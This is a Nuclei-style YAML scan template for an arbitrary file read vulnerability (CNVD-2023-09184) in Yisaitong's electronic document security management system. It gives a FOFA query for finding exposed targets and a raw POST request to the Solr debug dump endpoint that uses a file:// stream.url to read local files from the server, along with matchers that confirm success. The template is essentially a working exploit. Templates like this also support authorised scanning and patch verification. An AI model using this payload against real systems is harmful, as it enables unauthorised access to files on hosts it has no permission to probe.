id: yisaitong-e-drm-arbitrary-file-read

info:
  name: "亿赛通电子文档安全管理系统dump接口任意文件读取漏洞"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: title="电子文档安全管理系统"
    亿赛通电子文档安全管理系统 dump接口存在文件访问控制缺陷，攻击者可利用该缺陷读取任意文件内容。
  reference:
  - CNVD-2023-09184
  tags: 亿赛通

http:
- raw:
  - |
    POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1
    Host: {{Hostname}}
    Connection: close
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Cache-Control: max-age=0
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1

    stream.url=file:///C:\Program Files\
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'response'
  - type: word
    part: body
    words:
    - 'param'
